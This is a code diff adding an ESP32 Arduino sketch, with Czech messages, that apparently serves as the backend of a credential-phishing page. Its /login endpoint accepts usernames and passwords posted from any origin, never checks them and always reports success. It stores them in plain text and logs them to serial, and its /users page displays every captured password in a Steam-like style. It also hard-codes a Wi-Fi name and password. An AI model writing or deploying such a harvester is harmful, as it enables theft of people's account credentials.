@@ -1,0 +1,103 @@
+#include <WiFi.h>
+#include <WebServer.h>
+
+const char* ssid = "rojas1";
+const char* password = "12345678";
+
+WebServer server(80);
+
+struct Credential {
+  String username;
+  String password;
+};
+
+Credential credentials[10];
+int credentialCount = 0;
+
+void handleLogin() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.sendHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
+  server.sendHeader("Access-Control-Allow-Headers", "Content-Type");
+
+  if (server.method() == HTTP_OPTIONS) {
+    server.send(204);
+    return;
+  }
+
+  if (server.method() == HTTP_POST) {
+    String username = server.arg("username");
+    String password = server.arg("password");
+
+    Serial.println("Přijatý požadavek:");
+    Serial.println("Username: " + username);
+    Serial.println("Password: " + password);
+
+    if (username != "" && password != "") {
+      if (credentialCount < 10) {
+        credentials[credentialCount].username = username;
+        credentials[credentialCount].password = password;
+        credentialCount++;
+        Serial.println("Uloženo: " + username + ", " + password);
+        server.send(200, "text/plain", "Přihlášení úspěšné");
+      } else {
+        server.send(400, "text/plain", "Paměť plná");
+      }
+    } else {
+      server.send(400, "text/plain", "Chybný formát");
+    }
+  } else if (server.method() == HTTP_GET) {
+    server.send(200, "text/plain", "Toto je přihlašovací endpoint, použij POST!");
+  } else {
+    server.send(405, "text/plain", "Metoda není povolena");
+  }
+}
+
+void handleUsers() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String html = "<!DOCTYPE html><html><head><title>Seznam uživatelů</title>";
+  html += "<meta charset=\"UTF-8\">";
+  html += "<style>";
+  html += "body { background-color: #1b2838; color: #c7d5e0; font-family: 'Arial', sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }";
+  html += "h1 { color: #67c1f5; text-align: center; text-transform: uppercase; margin-bottom: 20px; }";
+  html += "table { width: 80%; max-width: 800px; border-collapse: collapse; background-color: #32353c; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); border-radius: 5px; overflow: hidden; }";
+  html += "th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2a3e52; }";
+  html += "th { background-color: #171a21; color: #67c1f5; font-weight: bold; text-transform: uppercase; }";
+  html += "tr:nth-child(even) { background-color: #252a33; }";
+  html += "tr:hover { background-color: #2a3e52; transition: background-color 0.3s; }";
+  html += "</style>";
+  html += "</head><body>";
+  html += "<h1>Seznam přihlášených uživatelů</h1>";
+  html += "<table><tr><th>Uživatelské jméno</th><th>Heslo</th></tr>";
+
+  for (int i = 0; i < credentialCount; i++) {
+    html += "<tr><td>" + credentials[i].username + "</td><td>" + credentials[i].password + "</td></tr>";
+  }
+
+  html += "</table></body></html>";
+  server.send(200, "text/html", html);
+}
+
+void handleNotFound() {
+  server.send(404, "text/plain", "Stránka nenalezena");
+}
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.begin(ssid, password);
+  Serial.print("Připojování k Wi-Fi...");
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(1000);
+    Serial.print(".");
+  }
+  Serial.println("\nPřipojeno! IP adresa: " + WiFi.localIP().toString());
+
+  server.on("/login", handleLogin);
+  server.on("/users", handleUsers);
+  server.onNotFound(handleNotFound);
+  server.begin();
+  Serial.println("Server běží na portu 80");
+}
+
+void loop() {
+  server.handleClient();
+}
